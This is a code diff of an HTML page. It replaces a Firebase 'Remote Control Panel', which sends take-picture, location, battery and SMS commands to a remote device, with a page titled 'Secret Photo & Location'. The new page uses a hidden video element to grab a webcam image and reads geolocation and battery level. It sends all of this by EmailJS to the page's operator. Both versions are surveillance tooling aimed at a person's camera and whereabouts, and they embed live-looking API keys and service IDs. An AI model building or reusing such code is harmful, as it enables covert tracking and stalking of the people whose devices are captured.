@@ -1,85 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Control Panel</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+  <title>Secret Photo & Location</title>
 </head>
 <body>
-  <h2>Remote Control Panel</h2>
-
-  <button onclick="sendCommand('take_picture')">Take Picture</button>
-  <button onclick="sendCommand('get_location')">Get Location</button>
-  <button onclick="sendCommand('get_battery')">Get Battery</button>
-
-  <h3>Send SMS</h3>
-  <input type="text" id="smsNumber" placeholder="Phone Number">
-  <input type="text" id="smsText" placeholder="Message">
-  <button onclick="sendSMS()">Send SMS</button>
-
-  <h3>Latest Photo:</h3>
-  <img id="photo" src="" alt="No photo yet" width="300">
-
-  <h3>Location:</h3>
-  <p id="location">Waiting...</p>
-
-  <h3>Battery:</h3>
-  <p id="battery">Waiting...</p>
-
+  <h2>Choose an Option</h2>
+  <button onclick="sendLocationOnly()">Check Location Only</button>
+  <button onclick="captureAndSend()">Take Picture + Location</button>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyA3eivOxIpneLJYcmqAUrmVQaURCipy9oo",
-      authDomain: "remotecontrolapp-47b9f.firebaseapp.com",
-      databaseURL: "https://remotecontrolapp-47b9f-default-rtdb.firebaseio.com",
-      projectId: "remotecontrolapp-47b9f",
-      storageBucket: "remotecontrolapp-47b9f.appspot.com",
-      messagingSenderId: "601641517639",
-      appId: "1:601641517639:web:9c87d179951bb2811ee762"
-    };
+    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your EmailJS public key
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    function sendCommand(cmd) {
-      db.ref("commands").set({
-        action: cmd,
-        time: new Date().toLocaleString()
+    // Location Only
+    function sendLocationOnly() {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        navigator.getBattery().then(function(battery) {
+          const batteryLevel = Math.round(battery.level * 100) + "%";
+          const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}, Battery: ${batteryLevel}`;
+          emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: message,
+            image: ''
+          })
+          .then(res => console.log("Location sent!", res))
+          .catch(err => console.error("Email failed", err));
+        });
+      }, function(error) {
+        alert("Could not get location.");
+        console.error(error);
       });
     }
 
-    function sendSMS() {
-      const number = document.getElementById("smsNumber").value;
-      const message = document.getElementById("smsText").value;
-      db.ref("commands").set({
-        action: "send_sms",
-        number: number,
-        message: message,
-        time: new Date().toLocaleString()
+    // Picture + Location
+    async function captureAndSend() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+      canvas.width = 240;
+      canvas.height = 180;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageBase64 = canvas.toDataURL("image/png");
+      stream.getTracks().forEach(track => track.stop());
+
+      navigator.geolocation.getCurrentPosition(function(position) {
+        navigator.getBattery().then(function(battery) {
+          const batteryLevel = Math.round(battery.level * 100) + "%";
+          const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}, Battery: ${batteryLevel}`;
+          emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: message,
+            image: imageBase64
+          })
+          .then(res => console.log("Photo and location sent!", res))
+          .catch(err => console.error("Email failed", err));
+        });
+      }, function(error) {
+        alert("Could not get location.");
+        console.error(error);
       });
     }
-
-    db.ref("responses/photo").on("value", snapshot => {
-      const data = snapshot.val();
-      if (data && data.image) {
-        document.getElementById("photo").src = data.image;
-      }
-    });
-
-    db.ref("responses/location").on("value", snapshot => {
-      const data = snapshot.val();
-      if (data) {
-        document.getElementById("location").textContent =
-          `Latitude: ${data.lat}, Longitude: ${data.lon} (${data.time})`;
-      }
-    });
-
-    db.ref("responses/battery").on("value", snapshot => {
-      const data = snapshot.val();
-      if (data) {
-        document.getElementById("battery").textContent =
-          `Battery Level: ${data.level} (${data.time})`;
-      }
-    });
   </script>
 </body>
 </html>
